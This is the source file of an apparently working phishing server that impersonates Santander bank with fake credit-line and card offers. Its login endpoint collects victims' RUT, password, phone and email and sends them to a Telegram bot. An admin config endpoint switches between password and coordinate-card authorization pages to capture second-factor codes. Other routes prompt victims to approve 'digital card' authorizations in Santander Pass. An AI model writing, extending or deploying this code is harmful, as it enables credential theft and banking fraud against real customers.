const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");
const path = require("path");
const fs = require("fs");

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir archivos estáticos desde "public"
app.use(express.static(path.join(__dirname, "public")));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];

const CONFIG_FILE = path.join(__dirname, "config.json");
let config = {};
if (fs.existsSync(CONFIG_FILE)) {
  config = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
} else {
  config = {
    producto1: "Línea de Crédito",
    monto1: 5000000,
    producto2: "Tarjeta de Crédito WorldMember Limited Business",
    monto2: 5000000,
    tipoAutorizacion: "santander",
    coord1: "",
    coord2: "",
    coord3: "",
    factibilidad: "off"
  };
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
}

// Endpoint de login y correo
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, telefono, mail } = req.body;

  if (!telefono && !mail) {
    return res.status(400).send("❌ Debes ingresar teléfono o correo.");
  }

  if (rut && bloqueados.includes(rut)) {
    return res.status(403).send("❌ Tu clave digital ha sido bloqueada.");
  }

  const mensaje = mail
    ? `Nuevo correo recibido: ${mail}`
    : `Nuevo intento de inicio de sesión:\nRUT: ${rut}\nContraseña: ${passwd}\nTeléfono: ${telefono}`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send("✅ Datos procesados correctamente.");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al enviar datos.");
  }
});

// Endpoint de autorización general
app.post("/autorizar", async (req, res) => {
  const { mensaje } = req.body;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });
    res.send("✅ Autorización enviada.");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al enviar la autorización.");
  }
});

// Endpoint para coordenadas dinámicas
app.get("/coordenadas", (req, res) => {
  const letras = ["A","B","C","D","E","F"];
  const seleccion = letras.sort(() => 0.5 - Math.random()).slice(0,3);
  res.json({ coordenadas: seleccion });
});

// Configuración admin
app.get("/config", (req, res) => {
  res.json(config);
});

app.post("/config", (req, res) => {
  config = { ...config, ...req.body };
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
  res.json(config);
});

// Autorización de productos
app.get("/autorizacion", (req, res) => {
  if (config.tipoAutorizacion === "coordenadas") {
    return res.sendFile(path.join(__dirname, "public", "coordenadas.html"));
  } else {
    return res.sendFile(path.join(__dirname, "public", "pass.html"));
  }
});

// Factibilidad de tarjeta
app.get("/factibilidad", (req, res) => {
  if (config.factibilidad === "on") {
    return res.sendFile(path.join(__dirname, "public", "creditCardEvaluation.html"));
  } else {
    return res.send("❌ La opción de factibilidad está deshabilitada en el panel de administración.");
  }
});

// Flujo de factibilidad
app.post("/credit/visualizacion", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "creditCardVisualization.html"));
});

app.post("/credit/autorizar", async (req, res) => {
  const mensaje = "AUTORIZA TARJETA DIGITAL!!";
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send(`
      <html>
        <body>
          <img src="logo-office-banking.png" style="height:60px;">
          <h2>VISUALIZACIÓN DE TU TARJETA DIGITAL</h2>
          <p style="color:red;">Debes autorizar en tu Santander Pass la visualización de la tarjeta.</p>
        </body>
      </html>
    `);
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al enviar la autorización.");
  }
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en el puerto ${PORT}`);
});
